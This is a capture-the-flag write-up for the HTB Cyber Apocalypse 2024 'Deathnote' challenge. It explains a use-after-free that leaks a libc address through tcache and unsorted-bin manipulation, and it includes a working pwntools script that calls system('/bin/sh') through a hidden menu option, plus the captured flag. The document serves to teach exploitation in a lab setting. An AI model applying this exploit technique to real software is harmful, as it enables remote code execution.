# Cyber Apocalypse 2024

# Deathnote

> You stumble upon a mysterious and ancient tome, said to hold the secret to vanquishing your enemies. Legends speak of its magic powers, but cautionary tales warn of the dangers of misuse.

## Analysis

First let's examine what we got. The deathnote binary is a simple note app with 4 functionalities. It is a secret what function 42 does, haha.

![image](https://github.com/respawnRW/writeups/assets/163560495/491c9633-53eb-4064-beb4-e4b833991a99)

Let's check the binary securities, we also know that it's a pwn challenge, we ned to know what we are facing.
```bash
└─$ checksec deathnote     
[*] '/home/kali/htb_stuffz/ctf_2024/pwn_deathnote/challenge/deathnote'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
    RUNPATH:  b'./glibc/'
```

Main options that are self-explanatory functionalities are note creation (create note), remove entry (freeing up), and displaying a note.

If we launch the binary, functionalities 1-3 are working fine. Nonetheless, the option 42 is giving us a segmentation fault.

![image](https://github.com/respawnRW/writeups/assets/163560495/2052f961-f70a-4f83-b6ad-94e8d3260220)

Assumption is that we are trying to execute memory location, something that causes the segmentation fault. 

And we're going to work on this! Option no 42 is the key ?¿?¿? to pwn.

## Solution

What we can see during the disassembly is that our assumption was correct. Option 42 is trying to execute the address from page 0 with the argument of page 1 as parameter. This means we are going to attemt use after free vulnerability exploitation. Malloc metadata from the freed chunks should be leakable. Our plan is to prepare the heap, fill up the tcache bins, so the metadata of malloc is going to leak the `unsortedbin` address in libc and finally we can calculate the base address of it.

It's pretty simple actually. Our approach is going to be abusing a user-after-free vulnerability, the strategy is exploiting the heap and leveraging a leak to call a libc function. In order to prepare for the heap manipulation, we need to set up the necessary conditions for the buffer overflow. This means filling up the tcache bins by creating and deleting several notes. Once the setup is ready, we can remove a note and the libc pointer is going to be put in its place. We can then proceed to read this note. Which isn't going to be a note, hell yeah; because that's how we're going to leak the libc address. From this point, we can find the system function's address in memory. 

By creating another note, we can manipulate execution flow, and rewrite the function pointer/return address where we want to: to the system function's address. The second note that we create now is going to be the argument of the ystem function call, which is `'/bin/sh'` since we are planning to spawn a shell. And knowing from the disassembled code, we can now launch that undocumented super-secret '#42' functionality. That command #42 is going to trigger the execution flow of our buffer overflow. And that's it, wrapping it up.

Check out the entire pwner script fully commented, everything should make sense.

```python
#!/usr/bin/env python3

from pwn import *
import time

context.binary = elf = ELF('./deathnote')
context.log_level = 'error'

io = remote("94.237.57.59", 34787) if args.REMOTE else process()

def create_note(size, page, content):
    # note creation function
    io.recv(2048)
    io.sendline(b'1')  # Send the option to create a note
    io.recv(2048)
    io.sendline(str(size).encode())
    io.recv(2048)
    io.sendline(str(page).encode())
    io.recv(2048)
    io.sendline(content)

def free_note(page):
    # Function to delete a note corresponding to the specified page number
    io.recv(2048)
    io.sendline(b'2')  # send the option #2 to free up
    io.recv(1024)
    io.sendline(str(page).encode())

def read_note(page):
    # Function to read a note from the specified page number
    io.recv(2048)
    io.sendline(b'3')  # send option #3 to read
    io.recv(1024)
    io.sendline(str(page).encode())

def execute_code():
    # triggering the buffer overflow and RCE
    io.recv(2048)
    io.sendline(b'42')  # option 42 ????

# fill up tcache bins, prepare for buffer overflow
for i in range(0, 10):
    create_note(128, i, b'blah')

for i in range(1, 10):
    free_note(i)

# where the leak happens, freeing a note then reading it, will contain a pointer to libc!
free_note(0)
read_note(0)
io.recvline()  # clear out any previous data up to a newline

# parse the leaked address (strip whitespaces, split at colon, and the address placed into variable)
leak = unpack(io.recvline().strip().split(b": ")[1].ljust(8, b'\x00'))

# calculating the libc address
libc_system = leak - 1875824

# let's create those 2 notes to overwrite function pointers, call to 'system' to execute '/bin/sh'
create_note(len(hex(libc_system)[2:].encode())+1, 0, hex(libc_system)[2:].encode())
create_note(len(b'/bin/sh')+1, 1, b'/bin/sh')

# let's wrap it up
execute_code()

io.interactive()
io.close()
```

And here's how the script is doing its job.

![image](https://github.com/respawnRW/writeups/assets/163560495/31d05974-1139-4d45-9bec-14fbfe018826)

Flag: `HTB{0m43_w4_m0u_5h1nd31ru~uWu}`

Be done with it.

Hope you find it useful,

`--RW`

## Resources

https://6point6.co.uk/insights/common-software-vulnerabilities-part-ii-explaining-the-use-after-free/
